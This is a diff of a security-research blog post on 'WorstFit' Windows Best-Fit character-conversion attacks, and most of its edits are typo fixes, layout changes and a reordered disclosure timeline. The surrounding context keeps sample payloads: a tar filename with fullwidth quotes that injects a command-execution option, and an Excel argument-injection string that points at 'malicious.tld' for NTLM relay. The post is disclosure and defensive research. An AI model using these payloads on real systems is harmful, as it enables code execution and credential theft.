@@ -699,7 +699,7 @@
 
 <h3 id="the-dual-era-of-encoding">The Dual Era of Encoding</h3>
 
-<p>Even though Unicode became the backbone of Windows, Windows still need to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:</p>
+<p>Even though Unicode became the backbone of Windows, Windows still needs to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:</p>
 
 <ul>
   <li><strong>ANSI APIs</strong>: A Windows code page version with the letter “A” postfix used to indicate “ANSI”. For example, <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea"><code class="language-plaintext highlighter-rouge">GetEnvironmentVariableA</code></a> function.</li>
@@ -737,7 +737,7 @@
 
 <p>This bizarre transformation is what’s known as <strong>“Best-Fit”</strong> behavior. As a result, the original string <code class="language-plaintext highlighter-rouge">√π⁷≤∞</code> transforms into a nonsensical <code class="language-plaintext highlighter-rouge">"vp7=8"</code>. This behavior highlights the pitfalls of relying on ANSI APIs when handling non-ASCII characters.</p>
 
-<p>And actually, it’s not just when using Windows APIs directly — this behaciour also occurs when using non-wide-character version CRT (C runtime) functions like <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv"><code class="language-plaintext highlighter-rouge">getenv</code></a>. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character <code class="language-plaintext highlighter-rouge">main</code> function like:</p>
+<p>And actually, it’s not just when using Windows APIs directly — this behaviour also occurs when using non-wide-character version CRT (C runtime) functions like <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv"><code class="language-plaintext highlighter-rouge">getenv</code></a>. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character <code class="language-plaintext highlighter-rouge">main</code> function like:</p>
 <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span>
@@ -764,13 +764,15 @@
 
 <p>For instance, the <code class="language-plaintext highlighter-rouge">∞</code> (<a href="https://www.compart.com/en/unicode/U+221E">U+221E</a>) symbol isn’t part of the <a href="https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout">Windows-1252 code page</a>, so Microsoft decided to map it to the “<strong>closest</strong>” character—<code class="language-plaintext highlighter-rouge">8</code> (<a href="https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e">🔍</a>). Uh, okay. Yeah I guess they kinda look similar, but I thought they should be still completely different things…</p>
 
-<p>Anyway, obviously there’s no strict formula for Best-Fit mapping – what Microsoft do is more about making characters look, or even “feel” somewhat alike.</p>
+<p>Anyway, obviously there’s no strict formula for Best-Fit mapping – what Microsoft does is more about making characters look, or even “feel” somewhat alike.</p>
 
 <p>Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (<code class="language-plaintext highlighter-rouge">U+00A5</code>) is mapped to a backslash (<code class="language-plaintext highlighter-rouge">\</code>) on the Japanese (932) code page, to a “Y” on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings.</p>
 
 <p>If you’re curious about the specifics, you can check out our <a href="https://worst.fit/mapping/">Best-fit Mapping Grepper</a> tool or dive into the raw mapping data on <a href="https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt">Unicode.org</a> by yourself.</p>
 
 <p>Interestingly, during our research we found that this <strong>Best-Fit</strong> behavior was already mentioned back in Black Hat USA 2009 during Chris Weber’s presentation, <a href="https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-SLIDES.pdf">“Unicode Security”</a>. However, he only briefly touched on how this feature could be exploited to bypass simple blacklist.</p>
+
+<p><em>(<strong>Updated</strong>: After this article was published, we learned that <a href="https://x.com/hasegawayosuke">Yosuke HASEGAWA</a> also mentioned this behavior at <a href="https://www.blackhat.com/presentations/bh-jp-08/bh-jp-08-Hasegawa/BlackHat-japan-08-Hasegawa-Char-Encoding.pdf">Black Hat Japan 2008</a>, covering part of our Filename Smuggling in Japanese code page.)</em></p>
 
 <p>But this time, we’re taking big steps forward – showing how those sneaky Best-Fit conversions can operate on a <strong>system-wide level</strong>, leading to even more impactful exploits, all unfolding right under your nose.</p>
 
@@ -828,7 +830,7 @@
 <strong>Threat Characters</strong>: <code class="language-plaintext highlighter-rouge">／</code> <a href="https://www.compart.com/en/unicode/U+FF0F">U+FF0F</a>, <code class="language-plaintext highlighter-rouge">＼</code> <a href="https://www.compart.com/en/unicode/U+FF3C">U+FF3C</a>, <code class="language-plaintext highlighter-rouge">¥</code> <a href="https://www.compart.com/en/unicode/U+00A5">U+00A5</a> (JP), <code class="language-plaintext highlighter-rouge">₩</code> <a href="https://www.compart.com/en/unicode/U+20A9">U+20A9</a> (KR)</p>
 </blockquote>
 
-<p>Let’s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (<code class="language-plaintext highlighter-rouge">d8.exe</code>) uses the ANSI API <code class="language-plaintext highlighter-rouge">GetCurrentDirectoryA()</code> to obtain the current working directory. This means that if we can have a working direcotry with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.</p>
+<p>Let’s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (<code class="language-plaintext highlighter-rouge">d8.exe</code>) uses the ANSI API <code class="language-plaintext highlighter-rouge">GetCurrentDirectoryA()</code> to obtain the current working directory. This means that if we can have a working directory with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.</p>
 
 <p><img src="/assets/img/blog/20250109/4.png" alt="" />
 <em>↑ Unintended file access on the <code class="language-plaintext highlighter-rouge">C:/windows/win.ini</code>:</em></p>
@@ -838,7 +840,7 @@
 <p><img src="/assets/img/blog/20250109/5.png" alt="" />
 <em>↑ Pollute the return value of <code class="language-plaintext highlighter-rouge">Dir.getwd()</code>:</em></p>
 
-<p>Of course, the above cases are still bugs instead of real vulneraiblities. Let’s take a look at some real-world cases!</p>
+<p>Of course, the above cases are still bugs instead of real vulnerabilities. Let’s take a look at some real-world cases!</p>
 
 <h4 id="-case-study---path-traversal-to-rce-on-cuckoo-sandbox">➤ Case Study - Path Traversal to RCE on Cuckoo Sandbox</h4>
 
@@ -869,9 +871,9 @@
 
 <p><img src="/assets/img/blog/20250109/6.png" alt="" /></p>
 
-<p>The attacker can then download <code class="language-plaintext highlighter-rouge">cuckoo.conf</code>, and gathered serveral sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!</p>
+<p>The attacker can then download <code class="language-plaintext highlighter-rouge">cuckoo.conf</code>, and gathered several sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!</p>
 
-<iframe width="560" height="315" src="https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+<iframe width="100%" height="315" src="https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
 
 <p><br /></p>
 
@@ -921,7 +923,7 @@ It could pop <strong>calc.exe</strong> on the system!</p>
 
 <p>But still, why can these double quotes alter the arguments?</p>
 
-<p>Firstly, on Windows, the <strong>entire command line</strong> is passed as a single string to the spawned process, leaving it up to the executable to parse. That’s why the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw">CreateProcess API</a> accepts the <code class="language-plaintext highlighter-rouge">lpCommandLine</code> patameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out <a href="https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN">this article</a> by David Deley.</p>
+<p>Firstly, on Windows, the <strong>entire command line</strong> is passed as a single string to the spawned process, leaving it up to the executable to parse. That’s why the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw">CreateProcess API</a> accepts the <code class="language-plaintext highlighter-rouge">lpCommandLine</code> parameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out <a href="https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN">this article</a> by David Deley.</p>
 
 <p><img src="/assets/img/blog/20250109/7.png" alt="" /></p>
 
@@ -1016,7 +1018,7 @@ It could pop <strong>calc.exe</strong> on the system!</p>
 
 <p>To exploit this, we can simply name the tar file as <code class="language-plaintext highlighter-rouge">aaa＂ ＂--use-compress-program=calc＂ ＂bbb.tar</code> (<code class="language-plaintext highlighter-rouge">＂</code> is <code class="language-plaintext highlighter-rouge">U+FF02</code>). This injects the <code class="language-plaintext highlighter-rouge">--use-compress-program</code> parameter, which allows arbitrary command execution. In our demonstration, this results in popping up <code class="language-plaintext highlighter-rouge">calc.exe</code>.</p>
 
-<iframe width="560" height="315" src="https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+<iframe width="100%" height="315" src="https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
 
 <blockquote>
   <p>In this demonstration, we use an English-configured Windows server (Code Page 1252) as an example. This technique should also work on other 125x code pages and Code Page 874 configurations.</p>
@@ -1028,11 +1030,11 @@ It could pop <strong>calc.exe</strong> on the system!</p>
 
 <p>The first one involves a modified version of plink.exe used in <strong>TortoiseGit</strong>. When a user enters a malicious URI for cloning, it can trigger code execution. For details, check out our <a href="https://worst.fit/worstfit/Arg-Splitting/plink/">curated list</a>.</p>
 
-<iframe width="560" height="315" src="https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+<iframe width="100%" height="315" src="https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
 
 <p>The second example involves <strong>RStudio</strong>, which supports version control with SVN. If an SVN project is placed in a maliciously crafted folder, a single click can trigger a calculator to pop up on the user’s machine! For more details, check out our <a href="https://worst.fit/worstfit/Arg-Splitting/SVN/">curated list</a>.</p>
 
-<iframe width="560" height="315" src="https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+<iframe width="100%" height="315" src="https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
 
 <h4 id="-case-study-3---microsoft-excel-remote-code-execution-cve-2024-49026">➤ Case Study 3 - Microsoft Excel Remote Code Execution <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026">CVE-2024-49026</a></h4>
 
@@ -1048,9 +1050,9 @@ It could pop <strong>calc.exe</strong> on the system!</p>
   <p><code class="language-plaintext highlighter-rouge">．．／．．／．．／Windows／win.ini＂ ／n ＂＼＼malicious.tld@80＼pwn.xlsx</code></p>
 </blockquote>
 
-<p>By combining two tricks, we can trigger an Argument Injection on <code class="language-plaintext highlighter-rouge">Excel.exe</code> with just 1-Clik. Since Excel itself <a href="https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel">doesn’t have any good argument</a> for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!</p>
+<p>By combining two tricks, we can trigger an Argument Injection on <code class="language-plaintext highlighter-rouge">Excel.exe</code> with just 1-Click. Since Excel itself <a href="https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel">doesn’t have any good argument</a> for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!</p>
 
-<iframe width="560" height="315" src="https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+<iframe width="100%" height="315" src="https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
 
 <p><em>P.S. if you find a better argument that can directly lead to RCE, please let us know!</em> 🙂</p>
 
@@ -1138,7 +1140,7 @@ It could pop <strong>calc.exe</strong> on the system!</p>
 
 <h4 id="-who-is-responsible-for-that">🧐 <strong>Who is responsible for that?</strong></h4>
 
-<p>Even if we both agree that this is an issue, the next much challenging question is: “Who is responsible for it?” Since the problematic code are embedded automatically during compilation (the compiler attaches the entry <code class="language-plaintext highlighter-rouge">mainCRTStartup()</code>, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because <strong>“the developer failed to use the correct <code class="language-plaintext highlighter-rouge">wmain()</code>”</strong>, or is it <strong>“CRT’s failure for not splitting the command line well and pass the wrong argument to <code class="language-plaintext highlighter-rouge">main()</code>”</strong>?</p>
+<p>Even if we both agree that this is an issue, the next much challenging question is: “Who is responsible for it?” Since the problematic code is embedded automatically during compilation (the compiler attaches the entry <code class="language-plaintext highlighter-rouge">mainCRTStartup()</code>, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because <strong>“the developer failed to use the correct <code class="language-plaintext highlighter-rouge">wmain()</code>”</strong>, or is it <strong>“CRT’s failure for not splitting the command line well and pass the wrong argument to <code class="language-plaintext highlighter-rouge">main()</code>”</strong>?</p>
 
 <p>To make things even more confusing, some projects only provide source code, leaving the prebuilt executable files distributed to be handled by third-party volunteers across the Internet. In such cases, who should be held accountable for the issue? Taking it a step further, could this even be considered a case of <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)#Compiler_backdoors">compiler-introduced security vulnerabilities</a>? 😉</p>
 
@@ -1224,6 +1226,11 @@ It could pop <strong>calc.exe</strong> on the system!</p>
       <td style="text-align: left"><a href="https://hackerone.com/reports/2550951">Won’t Fix</a></td>
     </tr>
     <tr>
+      <td>2024/06/13</td>
+      <td style="text-align: left">Apache Subversion - <code class="language-plaintext highlighter-rouge">svn.exe</code></td>
+      <td style="text-align: left"><a href="https://nvd.nist.gov/vuln/detail/cve-2024-45720">CVE-2024-45720</a></td>
+    </tr>
+    <tr>
       <td>2024/06/16</td>
       <td style="text-align: left">Microsoft Tar - <code class="language-plaintext highlighter-rouge">tar.exe</code></td>
       <td style="text-align: left">Won’t Fix</td>
@@ -1239,14 +1246,19 @@ It could pop <strong>calc.exe</strong> on the system!</p>
       <td style="text-align: left">Won’t Fix</td>
     </tr>
     <tr>
-      <td>2024/08/19</td>
-      <td style="text-align: left">GNU Wget</td>
-      <td style="text-align: left">No Reply</td>
+      <td>2024/06/19</td>
+      <td style="text-align: left">Oracle Java - <code class="language-plaintext highlighter-rouge">java.exe</code></td>
+      <td style="text-align: left">Pending Fix</td>
     </tr>
     <tr>
-      <td>2024/06/13</td>
-      <td style="text-align: left">Apache Subversion - <code class="language-plaintext highlighter-rouge">svn.exe</code></td>
-      <td style="text-align: left">CVE-2024-45720</td>
+      <td>2024/06/19</td>
+      <td style="text-align: left">Perl - <code class="language-plaintext highlighter-rouge">perl.exe</code></td>
+      <td style="text-align: left">Won’t Fix</td>
+    </tr>
+    <tr>
+      <td>2024/07/15</td>
+      <td style="text-align: left">Perforce - <code class="language-plaintext highlighter-rouge">p4.exe</code></td>
+      <td style="text-align: left"><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8067">CVE-2024-8067</a></td>
     </tr>
     <tr>
       <td>2024/08/05</td>
@@ -1259,21 +1271,6 @@ It could pop <strong>calc.exe</strong> on the system!</p>
       <td style="text-align: left">Fixed</td>
     </tr>
     <tr>
-      <td>2024/07/15</td>
-      <td style="text-align: left">Perforce - <code class="language-plaintext highlighter-rouge">p4.exe</code></td>
-      <td style="text-align: left">CVE-2024-8067</td>
-    </tr>
-    <tr>
-      <td>2024/06/19</td>
-      <td style="text-align: left">Oracle Java - <code class="language-plaintext highlighter-rouge">java.exe</code></td>
-      <td style="text-align: left">Pending Fix</td>
-    </tr>
-    <tr>
-      <td>2024/06/19</td>
-      <td style="text-align: left">Perl - <code class="language-plaintext highlighter-rouge">perl.exe</code></td>
-      <td style="text-align: left">Won’t Fix</td>
-    </tr>
-    <tr>
       <td>2024/08/19</td>
       <td style="text-align: left">OpenSSL - <code class="language-plaintext highlighter-rouge">openssl.exe</code></td>
       <td style="text-align: left">Other</td>
@@ -1282,6 +1279,11 @@ It could pop <strong>calc.exe</strong> on the system!</p>
       <td>2024/08/19</td>
       <td style="text-align: left">wkhtmltopdf - <code class="language-plaintext highlighter-rouge">wkhtmltopdf.exe</code></td>
       <td style="text-align: left">EOL</td>
+    </tr>
+    <tr>
+      <td>2024/08/19</td>
+      <td style="text-align: left">GNU Wget</td>
+      <td style="text-align: left">No Reply</td>
     </tr>
   </tbody>
 </table>
@@ -1306,7 +1308,7 @@ It could pop <strong>calc.exe</strong> on the system!</p>
 
 <p><img src="/assets/img/blog/20250109/17.png" alt="" /></p>
 
-<p><strong>As a developer</strong>, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170"><code class="language-plaintext highlighter-rouge">_wgetcwd</code></a> and <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170"><code class="language-plaintext highlighter-rouge">_wgetenv</code></a>. Otherwise, the implementation of the underlying implementation still call the ANSI API, which is vulnerable to our WorstFit attacks, too!</p>
+<p><strong>As a developer</strong>, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170"><code class="language-plaintext highlighter-rouge">_wgetcwd</code></a> and <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170"><code class="language-plaintext highlighter-rouge">_wgetenv</code></a>. Otherwise, the underlying implementation can still call the ANSI API, which is vulnerable to our WorstFit attacks, too!</p>
 
 <h3 id="conclusion">Conclusion</h3>
 
